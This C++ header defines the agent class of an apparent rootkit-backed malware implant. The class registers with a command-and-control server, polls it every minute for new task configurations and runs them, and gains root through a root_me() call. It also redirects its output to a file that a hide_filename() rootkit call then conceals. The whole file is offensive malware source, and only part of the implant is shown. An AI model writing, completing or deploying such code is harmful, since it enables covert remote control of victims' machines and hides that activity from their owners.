#pragma once

#include "Task.h"
#include "../amazing_rootkit/api/api.h"
#include <vector>
#include <thread>
#include <unistd.h>
#include <fcntl.h>

using namespace std;
using json = nlohmann::json;

#define OUTPUT_FILE_NAME "out.txt"
#define NEW_CMD_INTERVAL 60 * 1

class Agent
{
private:
    int logs_file_fd;
    bool agent_run;
    std::vector<std::unique_ptr<Task>> tasks;
    json config;

    void run_all_tasks()
    {
        std::cout << "Running " << tasks.size() << " tasks !" << std::endl;

        for (const std::unique_ptr<Task> & t: tasks)
        {
            t->run();
        }
        
    }

    void add_task(Task * t, bool restart)
    {
        std::cout << "add_task" << std::endl;
        if(restart)
        {
            std::remove_if(tasks.begin(), tasks.end(), [t](const unique_ptr<Task> & task){ return *(task.get()) == t; });
        }

        tasks.push_back(std::unique_ptr<Task>(t));
    }

    void start_from_config(const json & config)
    {
        std::cout << "start_from_config" << std::endl;
        bool restart;

        for (auto& el : config.items())
        {
            std::string module_name = el.key();
            json val = el.value();
            if(val.contains("restart"))
            {
                restart = (val["restart"] == "1");
                val.erase("restart");
            }

            Task * t = Task::BuildTask(module_name, val);

            add_task(t, restart);
        }

        run_all_tasks();
    }

    bool agent_register()
    {
        return Communicator::getInstance().c2_registration();
    }

    bool get_server_config()
    {
        bool res;
        json current_config;
        if(res = Communicator::getInstance().check_new_command(&current_config))
        {
            config.swap(current_config);
        }
        return res;
    }

    bool redirect_stds()
    {
        logs_file_fd = open(OUTPUT_FILE_NAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (logs_file_fd == -1) {
            perror("Failed to open the file");
            return false;
        }

        if (dup2(logs_file_fd, STDOUT_FILENO) == -1) {
            perror("Failed to redirect stdout");
            close(logs_file_fd);
            return false;
        }

        if (dup2(logs_file_fd, STDERR_FILENO) == -1) {
            perror("Failed to redirect stderr");
            close(logs_file_fd);
            return false;
        }

        return hide_filename(OUTPUT_FILE_NAME);
    }

    bool init()
    {
        return root_me() == 1; //&& redirect_stds();
    }

public:
    Agent() : agent_run(true) 
    {
        if (!init())
        {
            throw std::runtime_error("Agent is not initialized !");
        }
        
    }

    ~Agent()
    {
        if (logs_file_fd > 0)
        {
            close(logs_file_fd);
        }
        
    }

    void start();

    void stop();
};
